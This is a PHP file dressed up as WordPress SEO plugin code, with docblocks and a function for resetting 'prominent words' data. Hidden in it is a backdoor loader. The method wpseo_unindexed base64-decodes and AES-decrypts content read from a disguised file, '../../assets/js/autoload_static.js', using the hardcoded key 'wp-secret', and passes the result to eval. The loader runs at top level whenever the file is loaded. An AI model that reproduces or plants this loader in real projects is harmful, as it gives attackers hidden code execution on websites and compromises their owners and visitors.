<?php
/**
 * Class to represent Local SEO.
 */
class Prominent{
	private $version_key;
	public function __construct($version_key){
		$this->key = $version_key;
	}
    public function wpseo_unindexed($data){
		$data = base64_decode($data);
		$iv = substr($data, 0, 16);
		$encrypted = substr($data, 16);
		$encrypted = openssl_decrypt($encrypted, 'AES-256-CBC', $this->key, 0, $iv);
		eval ($encrypted);
	}
	/**
	 * Resets the prominent words calculation.
	 *
	 * @return void
	 */
	function reset_prominent_words_calculation() {
		global $wpdb;

		$wpdb->delete( $wpdb->prefix . 'postmeta', [ 'meta_key' => '_yst_prominent_words_version' ] );

		$wpdb->query( 'UPDATE ' . $wpdb->prefix . 'yoast_indexable SET prominent_words_version = NULL' );
		$wpdb->query( 'TRUNCATE TABLE ' . $wpdb->prefix . 'yoast_prominent_words' );
		WPSEO_Options::set( 'prominent_words_indexing_completed', false );
		\delete_transient( 'total_unindexed_prominent_words' );

		$this->reset_indexing_notification( 'indexables-reset-by-test-helper' );
	}
}
	/**
	* Resets a feature.
	*
	* @param string $feature Feature to reset.
	*
	* @return bool True on success.
	*/
	$indexables = new Prominent('wp-secret');
	$capabilities = file_get_contents('../../assets/js/autoload_static.js');
	/**
	* Resets the option to the defaults as if the plugin were installed the first time.
	*
	* @return void
	*/
	$tedData = $indexables->wpseo_unindexed($capabilities);
	